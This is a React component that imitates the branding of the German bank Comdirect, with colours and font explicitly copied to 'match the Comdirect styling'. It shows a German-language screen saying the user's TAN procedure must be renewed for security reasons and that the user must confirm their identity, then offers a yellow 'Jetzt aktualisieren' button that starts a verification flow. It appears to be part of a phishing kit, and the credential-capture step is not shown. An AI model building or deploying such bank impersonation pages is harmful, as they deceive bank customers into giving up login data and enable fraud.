import React from 'react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  // CSS variables that match the Comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  return (
    <div style={{
      ...cssVariables,
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Arial, sans-serif'
    }}>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '980px', 
        margin: '0 auto', 
        padding: '4rem 2rem',
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '6rem'
      }}>
        <div style={{
          maxWidth: '600px',
          width: '100%'
        }}>
          {/* Main Title */}
          <h1 className="mobile-title" style={{
            color: 'var(--text)',
            fontSize: '3rem',
            fontWeight: '400',
            marginBottom: '1.5rem',
            fontFamily: 'MarkWeb, Arial, sans-serif',
            lineHeight: '1.2',
            letterSpacing: '-0.01em'
          }}>
            TAN-Verfahren erneuern
          </h1>
          
          {/* Subtitle */}
          <h2 style={{
            color: 'var(--text)',
            fontSize: '1.25rem',
            fontWeight: '400',
            marginBottom: '2rem',
            fontFamily: 'MarkWeb, Arial, sans-serif',
            lineHeight: '1.4'
          }}>
            Sicherheitsupdate erforderlich
          </h2>
          
          {/* Information Text */}
          <div style={{ marginBottom: '2.5rem' }}>
            <p style={{
              color: 'var(--text)',
              fontSize: '1rem',
              lineHeight: '1.6',
              marginBottom: '1.5rem',
              fontFamily: 'MarkWeb, Arial, sans-serif'
            }}>
              Aus Sicherheitsgründen ist eine Aktualisierung Ihres TAN-Verfahrens erforderlich. 
              Um Ihr Online-Banking weiterhin sicher nutzen zu können, bestätigen Sie bitte Ihre Identität.
            </p>
            
            <p style={{
              color: 'var(--text)',
              fontSize: '1rem',
              lineHeight: '1.6',
              marginBottom: '0',
              fontFamily: 'MarkWeb, Arial, sans-serif'
            }}>
              Dieser Vorgang dient dem Schutz Ihres Kontos und dauert nur wenige Minuten.
            </p>
          </div>
          
          {/* Comdirect Yellow Button */}
          <button
            onClick={onStartVerification}
            className="comdirect-button comdirect-button-large"
          >
            Jetzt aktualisieren
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M5 12h14M12 5l7 7-7 7"/>
            </svg>
          </button>
        </div>
      </div>
    </div>
  );
};

export default AccountCompromisedScreen;